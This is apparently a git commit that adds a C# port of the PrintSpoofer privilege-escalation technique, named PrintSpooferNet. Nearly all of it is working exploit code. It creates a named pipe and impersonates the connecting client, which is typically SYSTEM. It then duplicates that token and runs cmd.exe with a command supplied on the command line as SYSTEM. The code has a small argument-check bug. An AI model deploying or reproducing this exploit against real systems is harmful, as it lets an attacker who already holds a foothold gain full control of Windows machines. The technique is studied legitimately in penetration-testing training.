a20332c6ab2cf832d6342cad32d2a72cbc588d22
Ervin <49395120+copywrited@users.noreply.github.com>
2023-11-24 12:28:45 +0000

    Initial commit

---
+++ PrintSpooferNet/Program.cs
@@ -0,0 +1,194 @@
+﻿using System;
+using System.Runtime.InteropServices;
+using System.Security.Principal;
+using System.Text;
+
+namespace PrintSpooferNet
+{
+    internal class Program
+    {
+        [DllImport("kernel32.dll", SetLastError = true)]
+        static extern IntPtr CreateNamedPipe(
+            string lpName, 
+            uint dwOpenMode, 
+            uint dwPipeMode, 
+            uint nMaxInstances, 
+            uint nOutBufferSize, 
+            uint nInBufferSize, 
+            uint nDefaultTimeOut, 
+            IntPtr lpSecurityAttributes);
+
+        [DllImport("kernel32.dll")]
+        static extern bool ConnectNamedPipe(IntPtr hNamedPipe, IntPtr lpOverlapped);
+
+        [DllImport("Advapi32.dll")]
+        static extern bool ImpersonateNamedPipeClient(IntPtr hNamedPipe);
+
+        [DllImport("kernel32.dll")]
+        private static extern IntPtr GetCurrentThread();
+
+        [DllImport("advapi32.dll", SetLastError = true)]
+        static extern bool OpenThreadToken(IntPtr ThreadHandle, uint DesiredAccess, bool OpenAsSelf, out IntPtr TokenHandle);
+
+        [DllImport("advapi32.dll", SetLastError = true)]
+        static extern bool GetTokenInformation(IntPtr TokenHandle, uint TokenInformationClass, IntPtr TokenInformation, int TokenInformationLength, out int ReturnLength);
+
+        [StructLayout(LayoutKind.Sequential)]
+        public struct SID_AND_ATTRIBUTES
+        {
+            public IntPtr Sid;
+            public int Attributes;
+        }
+
+        public struct TOKEN_USER
+        {
+            public SID_AND_ATTRIBUTES User;
+        }
+
+        [DllImport("advapi32", CharSet = CharSet.Auto, SetLastError = true)]
+        static extern bool ConvertSidToStringSid(IntPtr pSID, out IntPtr ptrSid);
+
+        [DllImport("kernel32.dll", SetLastError = true)]
+        [return: MarshalAs(UnmanagedType.Bool)]
+        public static extern bool DisconnectNamedPipe(IntPtr hNamedPipe);
+
+        [DllImport("advapi32.dll", CharSet = CharSet.Auto, SetLastError = true)]
+        public extern static bool DuplicateTokenEx(IntPtr hExistingToken, uint dwDesiredAccess, IntPtr lpTokenAttributes, uint ImpersonationLevel, uint TokenType, out IntPtr phNewToken);
+
+        [StructLayout(LayoutKind.Sequential)]
+        public struct PROCESS_INFORMATION
+        {
+            public IntPtr hProcess;
+            public IntPtr hThread;
+            public int dwProcessId;
+            public int dwThreadId;
+        }
+
+        [StructLayout(LayoutKind.Sequential, CharSet = CharSet.Unicode)]
+        public struct STARTUPINFO
+        {
+            public Int32 cb;
+            public string lpReserved;
+            public string lpDesktop;
+            public string lpTitle;
+            public Int32 dwX;
+            public Int32 dwY;
+            public Int32 dwXSize;
+            public Int32 dwYSize;
+            public Int32 dwXCountChars;
+            public Int32 dwYCountChars;
+            public Int32 dwFillAttribute;
+            public Int32 dwFlags;
+            public Int16 wShowWindow;
+            public Int16 cbReserved2;
+            public IntPtr lpReserved2;
+            public IntPtr hStdInput;
+            public IntPtr hStdOutput;
+            public IntPtr hStdError;
+        }
+        [DllImport("advapi32", SetLastError = true, CharSet = CharSet.Unicode)]
+        public static extern bool CreateProcessWithTokenW(IntPtr hToken, UInt32 dwLogonFlags, string lpApplicationName, string lpCommandLine, UInt32 dwCreationFlags, IntPtr lpEnvironment, string lpCurrentDirectory, [In] ref STARTUPINFO lpStartupInfo, out PROCESS_INFORMATION lpProcessInformation);
+
+        [DllImport("advapi32.dll", SetLastError = true)]
+        static extern bool RevertToSelf();
+
+        [DllImport("kernel32.dll")]
+        static extern uint GetSystemDirectory([Out] StringBuilder lpBuffer, uint uSize);
+
+        [DllImport("userenv.dll", SetLastError = true)]
+        static extern bool CreateEnvironmentBlock(out IntPtr lpEnvironment, IntPtr hToken, bool bInherit);
+
+        public enum CreationFlags
+        {
+            DefaultErrorMode = 0x04000000,
+            NewConsole = 0x00000010,
+            NewProcessGroup = 0x00000200,
+            SeparateWOWVDM = 0x00000800,
+            Suspended = 0x00000004,
+            UnicodeEnvironment = 0x00000400,
+            ExtendedStartupInfoPresent = 0x00080000
+        }
+
+        public enum LogonFlags
+        {
+            WithProfile = 1,
+            NetCredentialsOnly
+        }
+
+        static void Main(string[] args)
+        {
+            if (args.Length == 0)
+            {
+                Console.WriteLine("Usage: PrintSpooferNet.exe pipename");
+                return;
+            }
+
+            /*
+             * 1. Start a named pipe server, listen for incomming connections and impersonate them
+             */
+
+            // Create a named pipe server. Must be in standardized naming format - \\.\pipe\pipename
+            string pipeName = args[0];
+            IntPtr hPipe = CreateNamedPipe(pipeName, 3, 0, 10, 0x1000, 0x1000, 0, IntPtr.Zero);
+
+            // Wait for any incoming pipe client
+            ConnectNamedPipe(hPipe, IntPtr.Zero);
+
+            // Impersonate the named pipe
+            ImpersonateNamedPipeClient(hPipe);
+
+            /*
+             * 2. Open the impersonated token and use GetTokenInformation to obtain a SID associated with the token and convert the SID to a
+             *    readable string
+             */
+
+            // Open the impersonated access token
+            IntPtr hToken;
+            OpenThreadToken(GetCurrentThread(), 0xF01FF, false, out hToken);
+
+            // Obtain the SID associated with the token
+            int TokenInfLength = 0;
+            GetTokenInformation(hToken, 1, IntPtr.Zero, TokenInfLength, out TokenInfLength);
+
+            // To allocate the TokenInformation buffer, we'll use the .NET Marshal.AllocHGlobal method, which can allocate unmanaged memory
+            IntPtr TokenInformation = Marshal.AllocHGlobal((IntPtr)TokenInfLength);
+            GetTokenInformation(hToken, 1, TokenInformation, TokenInfLength, out TokenInfLength);
+
+            // Convert SID to String format
+            TOKEN_USER TokenUser = (TOKEN_USER)Marshal.PtrToStructure(TokenInformation, typeof(TOKEN_USER));
+            IntPtr pstr = IntPtr.Zero;
+            Boolean ok = ConvertSidToStringSid(TokenUser.User.Sid, out pstr);
+            string sidstr = Marshal.PtrToStringAuto(pstr);
+
+            // Print the SID associated with the token
+            Console.WriteLine(@"Found sid {0}", sidstr);
+
+            // Obtain the newly found token and duplicate it as a primary token
+            IntPtr hSystemToken = IntPtr.Zero;
+            DuplicateTokenEx(hToken, 0xF01FF, IntPtr.Zero, 2, 1, out hSystemToken);
+
+            // Get an environment block for SYSTEM
+            StringBuilder sbSystemDir = new StringBuilder(256);
+            uint res1 = GetSystemDirectory(sbSystemDir, 256);
+            IntPtr env = IntPtr.Zero;
+            bool res = CreateEnvironmentBlock(out env, hSystemToken, false);
+
+            // Print the name of the impersonated account
+            String name = WindowsIdentity.GetCurrent().Name;
+            Console.WriteLine("Impersonated user is: " + name);
+
+            // Revert back from the impersonated system token
+            RevertToSelf();
+
+            // Start cmd as SYSTEM
+            PROCESS_INFORMATION pi = new PROCESS_INFORMATION();
+            STARTUPINFO si = new STARTUPINFO();
+            si.cb = Marshal.SizeOf(si);
+            si.lpDesktop = "WinSta0\\Default";
+            string cmd = "C:\\Windows\\System32\\cmd.exe /c " + args[1];
+            CreateProcessWithTokenW(hSystemToken, (uint)LogonFlags.WithProfile, null, cmd, (uint)CreationFlags.UnicodeEnvironment, env, sbSystemDir.ToString(), ref si, out pi);
+
+            DisconnectNamedPipe(hPipe);
+        }
+    }
+}
